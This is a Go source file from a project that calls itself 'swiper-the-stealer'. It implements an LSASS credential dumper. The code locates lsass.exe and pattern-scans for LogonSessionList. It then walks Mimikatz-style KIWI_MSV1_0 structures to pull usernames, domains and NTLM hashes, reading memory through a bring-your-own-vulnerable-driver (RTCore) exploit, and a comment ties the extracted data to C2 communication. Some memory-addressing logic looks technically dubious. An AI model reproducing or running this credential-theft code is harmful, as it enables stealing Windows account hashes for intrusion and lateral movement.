package lsass

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/pkg/logger"
)

const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

type Credential struct {
	Domain   string
	Username string
	NTLM     string
	Type     string
}

// LSASSCredentials for C2 communication
type LSASSCredentials struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	NTLM     string `json:"ntlm"`
	LM       string `json:"lm"`
	SHA1     string `json:"sha1"`
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uint64
}

// SwiperTheStealer structures
type KIWI_MSV1_0_LIST_63 struct {
	Flink                            uint64
	Blink                            uint64
	unk0                             uint64
	unk1                             uint64
	unk2                             uint64
	unk3                             uint64
	unk4                             uint64
	unk5                             uint64
	hSemaphore6                      uint64
	unk7                             uint64
	hSemaphore8                      uint64
	unk9                             uint64
	unk10                            uint64
	unk11                            uint64
	unk12                            uint64
	unk13                            uint64
	LocallyUniqueIdentifier          uint64
	SecondaryLocallyUniqueIdentifier uint64
	UserName                         UNICODE_STRING
	Domain                           UNICODE_STRING
	unk14                            uint64
	unk15                            uint64
	pSid                             uint64
	LogonType                        uint32
	Session                          uint32
	LogonTime                        uint64
	LogonServer                      UNICODE_STRING
	Credentials                      uint64 // Pointer to KIWI_MSV1_0_CREDENTIALS
	unk19                            uint64
	unk20                            uint64
	unk21                            uint64
	unk22                            uint64
	unk23                            uint64
	CredentialManager                uint64
}

type KIWI_MSV1_0_CREDENTIALS struct {
	Next                    uint64 // Pointer to next KIWI_MSV1_0_CREDENTIALS
	AuthenticationPackageId uint32
	PrimaryCredentials      uint64 // Pointer to KIWI_MSV1_0_PRIMARY_CREDENTIALS
}

type KIWI_MSV1_0_PRIMARY_CREDENTIALS struct {
	Next        uint64
	Primary     UNICODE_STRING
	Credentials UNICODE_STRING
}

type SwiperTheStealer struct {
	rtcore     *byovd.RTCoreExploit
	logger     *logger.Logger
	lsassPID   uint32
	lsasrvBase uint64
	lsasrvSize uint32
}

func NewSwiperTheStealer(rtcore *byovd.RTCoreExploit, log *logger.Logger) (*SwiperTheStealer, error) {
	log.Info("Creating SwiperTheStealer - Advanced Credential Extraction Engine")

	extractor := &SwiperTheStealer{
		rtcore: rtcore,
		logger: log,
	}

	// Step 1: Find LSASS process
	pid, err := extractor.FindLSASS()
	if err != nil {
		return nil, fmt.Errorf("failed to find LSASS: %v", err)
	}
	extractor.lsassPID = pid

	// Step 2: Use estimated LSASRV location
	extractor.lsasrvBase = 0x7FF000000000
	extractor.lsasrvSize = 0x100000

	return extractor, nil
}

// FindLSASS - Advanced LSASS process discovery
func (sts *SwiperTheStealer) FindLSASS() (uint32, error) {
	sts.logger.Info("Finding LSASS process using advanced method")

	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer syscall.CloseHandle(snapshot)

	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %v", err)
	}

	for {
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		if processName == "lsass.exe" {
			sts.logger.Infof("Found LSASS.exe with PID: %d", pe32.ProcessID)
			return pe32.ProcessID, nil
		}

		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("LSASS process not found")
}

// FindLogonSessionList - Advanced pattern matching
func (sts *SwiperTheStealer) FindLogonSessionList() (uint64, error) {
	sts.logger.Info("Finding LogonSessionList using advanced patterns")

	// Windows 10/11 pattern
	pattern := []byte{0x33, 0xFF, 0x41, 0x89, 0x37, 0x4C, 0x8B, 0xF3, 0x45, 0x85, 0xC0, 0x74}

	chunkSize := uint32(4096)
	for offset := uint32(0); offset < sts.lsasrvSize; offset += chunkSize {
		currentAddr := sts.lsasrvBase + uint64(offset)

		readSize := chunkSize
		if offset+readSize > sts.lsasrvSize {
			readSize = sts.lsasrvSize - offset
		}

		chunk, err := sts.rtcore.ReadPhysicalMemory(currentAddr, readSize)
		if err != nil {
			continue
		}

		// Look for pattern
		patternLen := uint32(len(pattern))
		for i := uint32(0); i <= readSize-patternLen; i++ {
			if len(chunk) >= int(i+patternLen) {
				match := true
				for j := uint32(0); j < patternLen; j++ {
					if chunk[i+j] != pattern[j] {
						match = false
						break
					}
				}

				if match {
					sts.logger.Infof("Found LogonSessionList pattern at offset 0x%X", offset+i)
					// Extract pointer
					if len(chunk) >= int(i+patternLen+8) {
						ptrBytes := chunk[i+patternLen+4 : i+patternLen+12]
						ptr := binary.LittleEndian.Uint64(ptrBytes)
						sts.logger.Infof("LogonSessionList pointer: 0x%X", ptr)
						return ptr, nil
					}
				}
			}
		}
	}

	return 0, fmt.Errorf("LogonSessionList pattern not found")
}

// ExtractCredentials - Advanced credential extraction
func (sts *SwiperTheStealer) ExtractCredentials() ([]Credential, error) {
	sts.logger.Info("Extracting credentials using SwiperTheStealer algorithm")

	// Find LogonSessionList
	listHead, err := sts.FindLogonSessionList()
	if err != nil {
		return nil, fmt.Errorf("failed to find LogonSessionList: %v", err)
	}

	var credentials []Credential

	// Walk the list
	current := listHead
	visited := make(map[uint64]bool)

	for current != 0 && current != listHead && !visited[current] {
		visited[current] = true

		// Read the KIWI_MSV1_0_LIST_63 structure
		entryData, err := sts.rtcore.ReadPhysicalMemory(current, uint32(unsafe.Sizeof(KIWI_MSV1_0_LIST_63{})))
		if err != nil {
			sts.logger.Errorf("Failed to read entry at 0x%X: %v", current, err)
			break
		}

		var entry KIWI_MSV1_0_LIST_63
		sts.parseStruct(entryData, &entry)

		// Extract credentials from this entry
		entryCreds, err := sts.extractCredentialsFromEntry(&entry, current)
		if err == nil {
			credentials = append(credentials, entryCreds...)
		}

		// Move to next entry
		current = entry.Flink
		if current == listHead {
			break
		}
	}

	sts.logger.Infof("Extracted %d credentials using SwiperTheStealer algorithm", len(credentials))
	return credentials, nil
}

// Extract credentials from a single entry
func (sts *SwiperTheStealer) extractCredentialsFromEntry(entry *KIWI_MSV1_0_LIST_63, entryAddr uint64) ([]Credential, error) {
	var credentials []Credential

	// Read username and domain
	username, err := sts.readUnicodeString(&entry.UserName)
	if err != nil {
		return nil, err
	}

	domain, err := sts.readUnicodeString(&entry.Domain)
	if err != nil {
		return nil, err
	}

	if username == "" {
		return credentials, nil // Skip empty entries
	}

	// Walk credentials chain
	if entry.Credentials != 0 {
		credPtr := entry.Credentials

		for credPtr != 0 {
			credData, err := sts.rtcore.ReadPhysicalMemory(credPtr, uint32(unsafe.Sizeof(KIWI_MSV1_0_CREDENTIALS{})))
			if err != nil {
				break
			}

			var creds KIWI_MSV1_0_CREDENTIALS
			sts.parseStruct(credData, &creds)

			// Read primary credentials
			if creds.PrimaryCredentials != 0 {
				primaryData, err := sts.rtcore.ReadPhysicalMemory(creds.PrimaryCredentials, uint32(unsafe.Sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS{})))
				if err == nil {
					var primary KIWI_MSV1_0_PRIMARY_CREDENTIALS
					sts.parseStruct(primaryData, &primary)

					// Extract NTLM hash from credentials
					ntlmHash, err := sts.extractNTLMHash(&primary.Credentials)
					if err == nil && ntlmHash != "" {
						credential := Credential{
							Domain:   domain,
							Username: username,
							NTLM:     ntlmHash,
							Type:     "NTLM",
						}
						credentials = append(credentials, credential)
					}
				}
			}

			credPtr = creds.Next
		}
	}

	return credentials, nil
}

// Helper functions
func (sts *SwiperTheStealer) readUnicodeString(us *UNICODE_STRING) (string, error) {
	if us.Length == 0 || us.Buffer == 0 {
		return "", nil
	}

	data, err := sts.rtcore.ReadPhysicalMemory(us.Buffer, uint32(us.Length))
	if err != nil {
		return "", err
	}

	// Convert UTF-16LE to string
	if len(data)%2 != 0 {
		return "", fmt.Errorf("invalid unicode string length")
	}

	utf16Data := make([]uint16, len(data)/2)
	for i := 0; i < len(utf16Data); i++ {
		utf16Data[i] = binary.LittleEndian.Uint16(data[i*2:])
	}

	return syscall.UTF16ToString(utf16Data), nil
}

func (sts *SwiperTheStealer) extractNTLMHash(us *UNICODE_STRING) (string, error) {
	if us.Length != 16 || us.Buffer == 0 { // NTLM hash is 16 bytes
		return "", fmt.Errorf("invalid NTLM hash length")
	}

	data, err := sts.rtcore.ReadPhysicalMemory(us.Buffer, 16)
	if err != nil {
		return "", err
	}

	return fmt.Sprintf("%X", data), nil
}

func (sts *SwiperTheStealer) parseStruct(data []byte, v interface{}) {
	// Simple binary parsing - copy data into struct
	switch v := v.(type) {
	case *KIWI_MSV1_0_LIST_63:
		size := int(unsafe.Sizeof(*v))
		if len(data) >= size {
			ptr := (*[1024]byte)(unsafe.Pointer(v))
			copy(ptr[:size], data[:size])
		}
	case *KIWI_MSV1_0_CREDENTIALS:
		size := int(unsafe.Sizeof(*v))
		if len(data) >= size {
			ptr := (*[1024]byte)(unsafe.Pointer(v))
			copy(ptr[:size], data[:size])
		}
	case *KIWI_MSV1_0_PRIMARY_CREDENTIALS:
		size := int(unsafe.Sizeof(*v))
		if len(data) >= size {
			ptr := (*[1024]byte)(unsafe.Pointer(v))
			copy(ptr[:size], data[:size])
		}
	}
}

// Execute - Main entry point
func (sts *SwiperTheStealer) Execute() ([]Credential, error) {
	sts.logger.Info("Executing SwiperTheStealer Algorithm")
	return sts.ExtractCredentials()
}
